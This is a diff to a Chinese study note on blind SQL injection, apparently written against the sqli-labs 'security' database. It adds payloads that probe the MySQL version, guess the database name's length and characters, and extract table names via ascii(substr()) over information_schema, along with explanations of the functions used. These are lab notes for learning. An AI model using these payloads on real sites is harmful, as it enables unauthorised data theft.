@@ -187,9 +187,50 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 答案在于 在`语句4`中，表单名作为一个字符串被赋给table_name，而在`语句5`中，表单名本身作为sql语句中的变量参与进语句中。
 
 ###### 另外一些注入的内容
-对mysql版本进行尝试
+1. 对mysql版本进行尝试
 
-`id=1' `
+`id=1' and left(version(),1)=1 --+`页面返回正常，mysql的版本用的是1.xxx的
+
+2. 猜测数据库长度
+
+`id=1 ' and  length(database())=8--+`数据库`security`字符长度为8，回显True
+
+3. 猜测数据库第一位字符
+
+`id=1 ' and left(database(),1)>"a" --+ `利用二分法可以快速猜解数据库名(os: 并非快速)
+
+# 困难预警
+(os:地狱绘图来的)
+
+4. 猜测数据库中的数据表
+
+举个例子: 如下数据表
+
+mysql> show tables;
+
++--------------------+
+
+| Tables_in_security |
+
++--------------------+
+
+| emails             |
+
+| referers           |
+
+| uagents            |
+
+| users              |
+
++--------------------+
+
+(1) 猜测数据表的第一位字符
+
+`id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>80 --+`
+
+仔细对照知识补充部分的函数解释来解读这段payload
+
+
 
 
 
@@ -224,4 +265,14 @@ MySQL 的报错格式是：... right syntax to use near '<出错的SQL片段>' a
 
 含义: database()函数会返回当前数据库的名称
 
+6. `left(a,b)`
 
+含义: 从左侧截取 a 的前 b 位
+
+7. `ascii()`
+
+含义: ascii()将某个字符转换为ascii值
+
+8. `substr()`
+
+含义: substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度
